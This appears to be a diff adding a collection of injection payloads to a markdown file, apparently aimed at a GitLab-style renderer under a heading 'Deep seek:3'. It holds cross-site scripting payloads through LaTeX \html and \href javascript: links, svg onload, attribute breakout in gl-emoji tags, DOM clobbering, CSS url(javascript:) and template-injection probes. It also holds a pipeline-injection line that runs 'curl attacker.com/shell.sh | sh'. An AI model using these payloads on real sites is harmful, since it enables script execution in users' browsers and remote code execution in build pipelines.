@@ -71,7 +71,54 @@ This commit will even run the piplines after the password expirey
 
 
 
-Deep seek:
+## Deep seek:3
+
 $$\html{<img src=x onerror=alert(document.domain)>}$$
 \href{javascript:alert(1)}{Click Here}
 \url{javascript:alert`XSS`}
+
+$$\begin{array}{c}\end{array}<!-- --><svg/onload=alert(1)>$$
+
+<gl-emoji 
+  data-name='" onmouseover="alert(1)'
+  data-unicode-version='" id="x" style="color:red;"
+>
+  😊
+</gl-emoji>
+
+
+
+\css{body{background:red;}}
+\class{test}{ \style{background:url("javascript:alert(1)")} }
+
+
+
+
+
+$$\html{<form id=attributes><input name=href></form>}$$
+<a id=attributes href="javascript:alert(1)">Click</a>
+
+
+
+\def\pipeline{!include .gitlab-ci.yml}
+\pipeline{image: alpine\nscript: - curl attacker.com/shell.sh | sh}
+
+
+
+
+\html{<%
+<%= 7*7 %>
+<% throw new Error("test") %>
+%>}
+
+
+
+
+
+$`\html{<!--<div>-->
+<gl-emoji 
+  data-name="x\" style=\"animation: x;"
+  data-unicode-version="x\">@keyframes x{from{background:url('?')}to{background:url('javascript:alert(1)')}}"
+>✅</gl-emoji>}`$
+
+$$\href{ \css{:target { background: url("javascript:alert(1)") } } }{}$$
